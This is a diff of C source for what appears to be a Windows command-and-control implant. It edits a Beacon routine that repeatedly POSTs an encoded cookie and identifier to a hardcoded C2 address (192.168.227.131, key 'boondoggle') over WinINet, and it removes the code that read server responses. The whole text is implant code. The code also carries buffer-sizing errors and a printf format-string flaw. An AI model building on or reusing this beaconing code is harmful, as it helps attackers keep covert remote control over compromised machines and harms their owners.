@@ -111,7 +111,7 @@ BOOL Registration(CHAR **cookie) {
     return TRUE;
 }
 
-BOOL Beacon(CHAR  **cookie) {
+BOOL Beacon(CHAR  *cookie) {
     CHAR *cmd = NULL;
 
     agent.address = "192.168.227.131";
@@ -121,10 +121,10 @@ BOOL Beacon(CHAR  **cookie) {
     agent.key = "boondoggle";
     agent.identifier = "beacon";
 
-    CHAR *format = "%s";
+    CHAR *format = "%s:%s";
     
-    CHAR *data_to_encode = malloc(strlen(format) + strlen(agent.identifier));
-    sprintf(data_to_encode, format, agent.identifier);
+    CHAR *data_to_encode = malloc(strlen(format)+ strlen(cookie) + strlen(agent.identifier));
+    sprintf(data_to_encode, format, cookie, agent.identifier);
 
     CHAR *data_encode = malloc(strlen(data_to_encode));
     DWORD data_encode_len = strlen(data_to_encode) * 2;
@@ -145,30 +145,6 @@ BOOL Beacon(CHAR  **cookie) {
             if (hRequest != NULL) {
                 HttpAddRequestHeaders(hRequest, content_length, -1, HTTP_ADDREQ_FLAG_ADD);
                 HttpSendRequest(hRequest, 0, 0, post_buffer, post_buffer_length);
-
-                CHAR *temp_buffer = NULL;
-                DWORD buffer_length = 0;
-                while (TRUE) {
-                    DWORD available_size = 0;
-                    DWORD download_buffer;
-                    BOOL available = InternetQueryDataAvailable(hRequest, &available_size, 0, 0);
-                    if (!available || available_size == 0) {
-                        break;
-                    }
-                    temp_buffer = (CHAR*)realloc(temp_buffer, available_size + 1);
-                    memset(temp_buffer, 0, available_size + 1);
-
-                    BOOL value = InternetReadFile(hRequest, temp_buffer, available_size, &download_buffer);
-                    if (!value || download_buffer == 0) {
-                        break;
-                    }
-                    buffer_length += download_buffer;
-                    *cookie = (CHAR*)realloc(*cookie, buffer_length + 1);
-                    sprintf_s(*cookie, buffer_length + 1, "%s\0", temp_buffer);
-                }
-
-                free(temp_buffer);
-                temp_buffer = NULL;
 
                 if (hRequest) {
                     InternetCloseHandle(hRequest);
@@ -200,7 +176,7 @@ int main() {
     Registration(&cookie);
     printf(cookie);
     while(TRUE) {
-        Beacon(&cookie);
-        // Sleep_Time();
+        Beacon(cookie);
+        Sleep_Time();
     }
 }
